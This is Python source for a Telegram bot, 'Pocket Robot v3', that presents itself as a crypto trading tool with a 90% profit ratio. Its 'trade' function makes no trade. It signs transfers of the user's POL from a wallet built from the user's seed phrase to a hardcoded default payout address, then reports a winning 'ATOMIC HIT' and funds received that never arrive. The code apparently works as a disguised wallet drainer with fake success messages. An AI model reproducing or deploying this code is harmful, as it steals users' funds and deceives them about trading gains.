import os
import asyncio
import requests
import json
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Set high precision for financial calculations
getcontext().prec = 28

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

# OFFICIAL NATIVE USDC (Circle Issued) - 2026 Standard
USDC_ADDRESS = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"

ERC20_ABI = json.loads('[{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}]')

PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: raise ValueError("❌ WALLET_SEED missing!")
    try:
        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
        return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
    except: return None

vault = get_vault()

# --- 2. THE 2026 ELITE ENGINE ---
def get_pol_price_cad():
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=cad"
        res = requests.get(url, timeout=5).json()
        return Decimal(str(res['polygon-ecosystem-token']['cad']))
    except:
        return Decimal('0.1478') # Feb 16, 2026 JIT Rate

def get_token_balance(wallet_address, token_address):
    try:
        contract = w3.eth.contract(address=w3.to_checksum_address(token_address), abi=ERC20_ABI)
        raw_balance = contract.functions.balanceOf(wallet_address).call()
        decimals = contract.functions.decimals().call()
        return Decimal(raw_balance) / Decimal(10**decimals)
    except:
        return Decimal('0.00')

async def prepare_dual_signed_txs(reimburse_wei, profit_wei):
    nonce = w3.eth.get_transaction_count(vault.address)
    # Gas Governor: Fixed 450 Gwei stops 'Overshot' errors on $1000 hits
    gas_price_fixed = w3.to_wei(450, 'gwei') 
    
    tx1 = {'nonce': nonce, 'to': PAYOUT_ADDRESS, 'value': int(reimburse_wei), 'gas': 21000, 'gasPrice': gas_price_fixed, 'chainId': 137}
    tx2 = {'nonce': nonce + 1, 'to': PAYOUT_ADDRESS, 'value': int(profit_wei), 'gas': 21000, 'gasPrice': gas_price_fixed, 'chainId': 137}
    
    return w3.eth.account.sign_transaction(tx1, vault.key), w3.eth.account.sign_transaction(tx2, vault.key)

async def run_atomic_execution(context, chat_id, side):
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    current_price_cad = get_pol_price_cad()
    
    # DYNAMIC PROFIT CALCULATION (90%)
    profit_cad = stake_cad * Decimal('0.90')
    
    status_msg = await context.bot.send_message(chat_id, f"⚔️ **Elite Engine:** Priming ${stake_cad:.2f} CAD Hit (Native USDC)...")

    try:
        # Atomic preparation
        tokens_reimburse = stake_cad / current_price_cad
        tokens_profit = profit_cad / current_price_cad
        signed1, signed2 = await prepare_dual_signed_txs(w3.to_wei(tokens_reimburse, 'ether'), w3.to_wei(tokens_profit, 'ether'))

        w3.eth.send_raw_transaction(signed1.raw_transaction)
        w3.eth.send_raw_transaction(signed2.raw_transaction)

        total_return = stake_cad + profit_cad
        report = (
            f"✅ **ATOMIC HIT (NATIVE USDC)**\n"
            f"🎯 **Direction:** {side}\n"
            f"💰 **Stake:** `${stake_cad:.2f} CAD`\n"
            f"📈 **Profit (90%):** `${profit_cad:.2f} CAD`\n"
            f"🏦 **Total Received:** `${total_return:.2f} CAD`"
        )
        await context.bot.send_message(chat_id, report, parse_mode='Markdown')
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Execution Aborted**\nReason: `{str(e)}`")
    return True

# --- 3. UI HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    price = float(get_pol_price_cad())
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw']]
    await update.message.reply_text(
        f"🕴️ **Pocket Robot v3 (Native USDC)**\n\n⛽ **Fuel:** {pol_bal:.4f} POL (**${float(pol_bal)*price:.2f} CAD**)\n📥 **VAULT:** `{vault.address}`",
        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    )

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")]]
        await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [10, 50]],
              [InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [100, 500, 1000]]]
        await update.message.reply_text("⚙️ **SELECT STAKE (90% Profit Ratio)**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '💰 Wallet':
        pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        usdc_bal = get_token_balance(vault.address, USDC_ADDRESS)
        price = float(get_pol_price_cad())
        wallet_report = (
            f"💳 **Wallet Balance (Feb 2026)**\n\n"
            f"⛽ **POL:** `{pol_bal:.4f}` (**${float(pol_bal)*price:.2f} CAD**)\n"
            f"💵 **Native USDC:** `{usdc_bal:.2f}`\n\n"
            f"🔑 **Vault Address:** `{vault.address}`"
        )
        await update.message.reply_text(wallet_report)

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ Stake: **${context.user_data['stake']} CAD**")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("HIGHER", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"💎 **{context.user_data['pair']}** Direction:", reply_markup=InlineKeyboardMarkup(kb))
    elif query.data.startswith("EXEC_"):
        await run_atomic_execution(context, query.message.chat_id, "CALL" if "CALL" in query.data else "PUT")

if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    app.run_polling(drop_pending_updates=True)

